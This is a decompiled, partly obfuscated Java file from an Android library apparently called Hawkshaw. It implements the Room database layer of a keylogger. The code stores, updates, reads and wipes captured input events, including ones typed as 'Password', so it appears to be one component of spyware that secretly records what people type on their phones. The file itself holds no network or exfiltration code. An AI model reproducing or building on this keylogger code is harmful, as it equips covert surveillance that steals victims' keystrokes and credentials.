package com.hawkshaw.library.datalayer.room.keylogger;

import C1.d;
import D1.a;
import D1.b;
import a3.e;
import android.os.CancellationSignal;
import androidx.room.A;
import androidx.room.C0276g;
import androidx.room.D;
import androidx.room.F;
import androidx.room.i;
import androidx.room.j;
import com.hawkshaw.library.datalayer.room.keylogger.KeyLogEntity;
import java.util.Collections;
import java.util.List;
import s.C0933b;

public final class KeyLoggerDao_Impl implements KeyLoggerDao {
    /* access modifiers changed from: private */
    public final A __db;
    /* access modifiers changed from: private */
    public final i __deletionAdapterOfKeyLogEntity;
    /* access modifiers changed from: private */
    public final j __insertionAdapterOfKeyLogEntity;
    /* access modifiers changed from: private */
    public final F __preparedStmtOfNukeTable;
    /* access modifiers changed from: private */
    public final i __updateAdapterOfKeyLogEntity;

    public KeyLoggerDao_Impl(A a5) {
        this.__db = a5;
        this.__insertionAdapterOfKeyLogEntity = new c(this, a5);
        this.__deletionAdapterOfKeyLogEntity = new C1.j(this, a5, 1);
        this.__updateAdapterOfKeyLogEntity = new d(this, a5);
        this.__preparedStmtOfNukeTable = new a(this, a5, 0);
    }

    /* access modifiers changed from: private */
    public String __Type_enumToString(KeyLogEntity.Type type) {
        int i5 = b.f4942a[type.ordinal()];
        if (i5 == 1) {
            return "Unknown";
        }
        if (i5 == 2) {
            return "TextChanged";
        }
        if (i5 == 3) {
            return "ViewClicked";
        }
        if (i5 == 4) {
            return "ViewFocused";
        }
        if (i5 == 5) {
            return "Password";
        }
        throw new IllegalArgumentException("Can't convert enum to string, unknown enum value: " + type);
    }

    /* access modifiers changed from: private */
    public KeyLogEntity.Type __Type_stringToEnum(String str) {
        str.getClass();
        char c5 = 65535;
        switch (str.hashCode()) {
            case -1776139870:
                if (str.equals("ViewClicked")) {
                    c5 = 0;
                    break;
                }
                break;
            case 967261426:
                if (str.equals("ViewFocused")) {
                    c5 = 1;
                    break;
                }
                break;
            case 1281629883:
                if (str.equals("Password")) {
                    c5 = 2;
                    break;
                }
                break;
            case 1379812394:
                if (str.equals("Unknown")) {
                    c5 = 3;
                    break;
                }
                break;
            case 1566875815:
                if (str.equals("TextChanged")) {
                    c5 = 4;
                    break;
                }
                break;
        }
        switch (c5) {
            case 0:
                return KeyLogEntity.Type.ViewClicked;
            case 1:
                return KeyLogEntity.Type.ViewFocused;
            case 2:
                return KeyLogEntity.Type.Password;
            case 3:
                return KeyLogEntity.Type.Unknown;
            case 4:
                return KeyLogEntity.Type.TextChanged;
            default:
                throw new IllegalArgumentException("Can't convert value to enum, unknown value: ".concat(str));
        }
    }

    public static List<Class<?>> getRequiredConverters() {
        return Collections.emptyList();
    }

    public Object getAll(e eVar) {
        D e5 = D.e(0, "SELECT * from KeyLogEntity");
        return C0276g.a(this.__db, new CancellationSignal(), new a(this, e5), eVar);
    }

    public Object nukeTable(e eVar) {
        return C0276g.b(this.__db, new d(this, 1), eVar);
    }

    public Object delete(KeyLogEntity keyLogEntity, e eVar) {
        return C0276g.b(this.__db, new C0933b(2, this, keyLogEntity), eVar);
    }

    public Object deleteAll(KeyLogEntity[] keyLogEntityArr, e eVar) {
        return C0276g.b(this.__db, new b(this, keyLogEntityArr, 1), eVar);
    }

    public Object insert(KeyLogEntity[] keyLogEntityArr, e eVar) {
        return C0276g.b(this.__db, new b(this, keyLogEntityArr, 0), eVar);
    }

    public void insertSync(KeyLogEntity... keyLogEntityArr) {
        this.__db.assertNotSuspendingTransaction();
        this.__db.beginTransaction();
        try {
            this.__insertionAdapterOfKeyLogEntity.f(keyLogEntityArr);
            this.__db.setTransactionSuccessful();
        } finally {
            this.__db.endTransaction();
        }
    }

    public Object update(KeyLogEntity[] keyLogEntityArr, e eVar) {
        return C0276g.b(this.__db, new b(this, keyLogEntityArr, 2), eVar);
    }

    public void updateSync(KeyLogEntity... keyLogEntityArr) {
        this.__db.assertNotSuspendingTransaction();
        this.__db.beginTransaction();
        try {
            this.__updateAdapterOfKeyLogEntity.f(keyLogEntityArr);
            this.__db.setTransactionSuccessful();
        } finally {
            this.__db.endTransaction();
        }
    }
}
